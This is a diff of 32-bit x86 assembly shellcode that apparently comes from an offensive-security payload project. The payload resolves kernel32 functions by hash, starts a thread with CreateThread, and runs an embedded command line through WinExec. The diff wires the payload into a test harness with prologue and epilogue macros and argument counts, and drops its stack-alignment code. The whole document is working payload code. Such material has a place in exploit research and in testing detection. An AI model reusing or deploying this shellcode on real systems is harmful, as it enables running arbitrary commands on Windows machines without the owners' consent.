@@ -1,22 +1,17 @@
 [ORG 0]
 [BITS 32]
 
+%include "../../../test/reg_x86.asm"
+
 entry:
+  Test_Prologue
   ; store context
   push ebx                              ; store ebx
+  cld                                   ; clear the direction flag
 
   ; calculate entry address
   call calc_entry_addr                  ; calculate the entry address
   flag_CEA:                             ; flag for calculate entry address
-
-  ; clear the direction flag
-  cld
-
-  ; ensure stack is 16 bytes aligned
-  push edi                              ; store edi
-  mov edi, esp                          ; store current stack to edi
-  and edi, 0xF                          ; calculate the offset
-  sub esp, edi                          ; adjust current stack
 
   ; call "kernel32.dll, CreateThread"
   push 0                                ; lpThreadId
@@ -26,6 +21,7 @@ entry:
   push ecx                              ; lpStartAddress
   push 0                                ; dwStackSize
   push 0                                ; lpThreadAttributes
+  push 6                                ; set num arguments
   push 0xE2C019B2                       ; set hash key
   push 0x2160C16A                       ; set function hash
   call api_call                         ; call api function
@@ -33,16 +29,14 @@ entry:
   ; call "kernel32.dll, WaitForSingleObject"
   push 1000                             ; set dwMilliseconds
   push eax                              ; set thread handle
+  push 2                                ; set num arguments
   push 0x0F929559                       ; set hash key
   push 0x2811A50E                       ; set function hash
   call api_call                         ; call api function
 
-  ; restore aligned stack
-  add esp, edi                          ; restore stack from edi
-  pop edi                               ; restore edi
-
   ; restore context
   pop ebx                               ; restore ebx
+  Test_Epilogue
   ret                                   ; return to the caller
 
 ; calculate shellcode entry address
@@ -52,33 +46,24 @@ calc_entry_addr:
   push eax                              ; push return address
   ret                                   ; return to entry
 
-; call "kernel32.dll, WinExec"
 win_exec:
+  ; store context
   push ebx                              ; store ebx
   mov ebx, ecx                          ; read entry address from ecx
+  cld                                   ; clear the direction flag
 
-  ; clear the direction flag
-  cld
-
-  ; ensure stack is 16 bytes aligned
-  push edi                              ; store edi
-  mov edi, esp                          ; store current stack to edi
-  and edi, 0xF                          ; calculate the offset
-  sub esp, edi                          ; adjust current stack
-
+  ; call "kernel32.dll, WinExec"
   lea edx, [ebx+command]                ; lpCmdLine
   xor ecx, ecx                          ; clear ecx
   mov cl, [ebx+cmd_show]                ; set uCmdShow
   push ecx                              ; push uCmdShow
   push edx                              ; push lpCmdLine
+  push 2                                ; set num arguments
   push 0x61DA2999                       ; set hash key
   push 0x0AE20914                       ; set function hash
   call api_call                         ; call api function
 
-  ; restore aligned stack
-  add esp, edi                          ; restore stack from edi
-  pop edi                               ; restore edi
-
+  ; restore context
   pop ebx                               ; restore ebx
   ret                                   ; exit thread
 
